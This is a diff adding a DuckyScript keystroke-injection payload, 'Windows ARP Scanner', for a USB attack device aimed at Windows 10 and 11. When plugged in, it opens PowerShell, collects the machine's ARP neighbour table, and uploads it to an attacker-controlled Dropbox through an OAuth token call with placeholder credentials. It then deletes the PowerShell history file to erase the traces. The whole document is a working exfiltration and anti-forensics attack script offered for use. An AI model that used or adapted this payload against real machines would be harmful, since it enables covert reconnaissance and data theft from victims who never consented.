@@ -1,0 +1,50 @@
+REM Title: Windows ARP Scanner
+REM Author: Who-Is-Julien
+REM Description: The payload performs an ARP scan on the target PC's network and sends the results of this scan to your Dropbox.
+REM Target: Windows 10, 11
+REM Category: Exfiltration
+
+
+REM Short delay time
+DEFINE SHORT 500
+REM Medium delay time
+DEFINE MEDIUM 2000
+
+
+EXTENSION POWERSHELL_TO_DROPBOX
+    REM For usage instructions look at https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/PowerShell_To_Dropbox/README.md
+
+
+    DEFINE REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    DEFINE APP_KEY XXXXXXXXXXXXXXX
+    DEFINE APP_SECRET XXXXXXXXXXXXXXX
+
+
+    FUNCTION REPORT()
+        STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{ "Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "
+        STRING REFRESH_TOKEN
+        STRING "; client_id = "
+        STRING APP_KEY
+        STRING "; client_secret = "
+        STRING APP_SECRET
+        STRING "}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }' } -Body $report | Out-Null
+    END_FUNCTION
+END_EXTENSION
+
+
+DELAY MEDIUM
+GUI x
+
+DELAY SHORT
+STRING i
+
+DELAY MEDIUM
+STRING $report = Get-NetNeighbor -State Stale,Reachable | Format-List -Property IPAddress,LinkLayerAddress | Out-String; 
+REPORT()
+STRING ; Remove-Item (Get-PSReadLineOption).HistorySavePath; exit
+
+DELAY SHORT
+ENTER
+
+DELAY SHORT
+ATTACKMODE OFF
